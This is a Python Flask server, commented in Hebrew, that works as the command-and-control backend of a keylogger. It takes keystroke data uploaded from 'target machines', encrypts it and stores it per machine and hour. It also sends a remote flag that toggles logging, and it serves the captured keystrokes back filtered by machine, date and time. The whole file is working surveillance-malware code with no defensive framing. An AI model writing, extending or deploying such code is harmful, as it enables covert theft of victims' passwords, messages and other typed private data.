import os
import json
import random
from flask import Flask, request, jsonify
from datetime import datetime
from encryptor import Encryptor
from flask_cors import CORS
from datetime import datetime, time as dtime

app = Flask(__name__)
def deep_merge(source, destination):
    # מבצע מיזוג עמוק של מילונים מקוננים.

    for key, value in source.items():
        if isinstance(value, dict) and key in destination and isinstance(destination[key], dict):
            # אם גם המפתח הקיים וגם החדש הם מילונים, קרא לפונקציה בצורה רקורסיבית
            destination[key] = deep_merge(value, destination[key])
        elif isinstance(value, str) and key in destination and isinstance(destination[key], str):
            # אם הערך קיים והוא מחרוזת, שרשר את הערך החדש לקיים
            destination[key] += value
        else:
            # אחרת, פשוט עדכן את הערך
            destination[key] = value
    return destination
CORS(app)

LOG_DIR = 'server_logs'                                                   # הגדרת נתיב לשמירת קבצי היומן
@app.route('/')
def home():
    """הוסף נקודת קצה מהשרת המרוחק"""
    return "KeyLogger Server is Running"

@app.route('/api/upload', methods=['POST'])

def save_data():
    status_listen = random.randint(0, 1)                            # אופציה לעצירת האזנה נצרך להחליף לקלט מהמשתמש

    if not request.is_json:                                               # בדוק אם הבקשה מכילה נתוני JSON
        return jsonify({"error": "Request must5 be JSON"}), 400

    data = request.get_json()                                             # קבל את הנתונים מהבקשה
    try:
        if not data:                                                      # במקום בדיקה עם {}, בודק אם המילון ריק או None
            return jsonify({"data": False ,"status_listen": status_listen}), 200
        write_to_file(data)                                               # קורא לפונקציה הייעודית לשמירת קבצים
        return jsonify({"data": True ,"status_listen": status_listen}), 200
    except Exception as e:
        return jsonify({"error": "Failed to save data", "details": str(e)}), 500

def write_to_file(data: dict):
    encryptor = Encryptor()
    data = encryptor.encrypt_dict(data)

    machine_name = next(iter(data.keys()))                                  # שליפת שם המכונה ששלחה נתונים
    data = data.pop(machine_name)
    full_path = os.path.join(LOG_DIR, machine_name)                         #יצירת תקיה עם שם המכונה בתוך תקיה מותאמת
    if not os.path.exists(full_path):
        os.makedirs(full_path)

    timestamp = datetime.now().strftime('%Y-%m-%d_%H')
    filename = f"{timestamp}.json"

    # יצירת שם קובץ ייחודי עם חותמת זמן
    file_path = os.path.join(full_path, filename)
    if not os.path.exists(file_path):
        with open(file_path, 'w', encoding='utf-8') as f:  # שמירת הנתונים לקובץ JSON
            date_data = next(iter(data.keys()))
            data = data.pop(date_data)
            json.dump(data, f, indent=4, ensure_ascii=False)  # המר את מילון הפייתון למחרוזת JSON
            print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
    else:
        with open(file_path, 'r', encoding='utf-8') as f:
            data_file = json.load(f)
            data_file = dict(data_file)
            date_data = next(iter(data.keys()))
            data = data.pop(date_data)
        merged_data1 = deep_merge(data, data_file)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(merged_data1, f, indent=4, ensure_ascii=False)  # המר את מילון הפייתון למחרוזת JSON
            print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")

        print(json.dumps(merged_data1, indent=4, ensure_ascii=False))
    return 200

@app.route('/api/get_target_machines_list', methods=['GET'])
def get_machines():
    """הוסף נקודת קצה מהשרת המרוחק"""
    if not os.path.exists(LOG_DIR):
        return jsonify([])
    machines = os.listdir(LOG_DIR)
    return jsonify(machines)



def _ptime(s: str | None) -> dtime | None:
    """'HH' | 'HH:MM' | 'HH:MM:SS' (כולל %3A) -> time"""
    if not s: return None
    s = s.replace('%3A', ':').strip()
    for fmt in ("%H:%M:%S", "%H:%M", "%H"):
        try: return datetime.strptime(s, fmt).time()
        except ValueError: pass
    return None

def _hour_from_fname(fname: str) -> int | None:
    """YYYY-MM-DD_HH.json -> HH"""
    try:   return int(os.path.splitext(fname)[0].rsplit('_', 1)[1])
    except: return None

def _timekey(k: str) -> dtime | None:
    """'HH:MM' | 'HH:MM:SS' -> time"""
    if not isinstance(k, str): return None
    for fmt in ("%H:%M:%S", "%H:%M"):
        try: return datetime.strptime(k.strip(), fmt).time()
        except ValueError: pass
    return None


@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine = request.args.get("machine")
    if not machine:
        return jsonify({"error": "Missing machine"}), 400

    date_str = request.args.get("date")        # YYYY-MM-DD
    start_t  = _ptime(request.args.get("start")) or dtime(0, 0, 0)
    end_t    = _ptime(request.args.get("end"))   or dtime(23, 59, 59)
    if start_t > end_t: start_t, end_t = end_t, start_t

    folder = os.path.join(LOG_DIR, machine)
    if not os.path.isdir(folder): return jsonify([])

    files = [f for f in os.listdir(folder) if f.endswith('.json')]
    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
    sh, eh = start_t.hour, end_t.hour
    files = [f for f in files if ((h := _hour_from_fname(f)) is not None and sh <= h <= eh)]
    files.sort()

    out = []
    for f in files:
        p = os.path.join(folder, f)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                obj = json.load(fh)   # מצפה למילון { "HH:MM(:SS)": {...} }
        except Exception:
            with open(p, "r", encoding="utf-8") as fh:
                out.append(fh.read())
            continue

        if not isinstance(obj, dict):
            out.append(json.dumps(obj, ensure_ascii=False)); continue

        # סינון מדויק לפי זמן (כולל הקצה end)
        filtered = {k:v for k,v in obj.items()
                    if (t := _timekey(k)) is None or (start_t <= t <= end_t)}
        if filtered:
            out.append(json.dumps(filtered, ensure_ascii=False, indent=2))

    return jsonify(out)


if __name__ == '__main__':
    app.run(debug=True, port=5000)